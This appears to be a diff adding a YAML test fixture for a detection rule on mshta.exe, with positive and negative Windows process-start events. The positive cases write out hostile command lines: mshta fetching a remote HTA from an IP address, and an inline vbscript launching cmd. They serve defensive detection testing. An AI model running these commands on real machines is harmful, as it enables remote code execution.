@@ -1,0 +1,45 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: mshta.exe, executable: 'C:\Windows\System32\mshta.exe', command_line: 'mshta http://203.0.113.9/a.hta'}
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: mshta.exe, executable: 'C:\Windows\System32\mshta.exe', command_line: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run
+        ""cmd""")(window.close)'}
+- id: pos3
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: mshta.exe, executable: 'C:\Windows\System32\mshta.exe', command_line: 'mshta C:\Users\bob\Downloads\x.hta'}
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: mshta.exe, executable: 'C:\Windows\System32\mshta.exe', command_line: mshta \\fileserver\apps\portal.hta}
+- id: neg2
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: notepad.exe, executable: 'C:\Windows\System32\notepad.exe', command_line: notepad.exe}
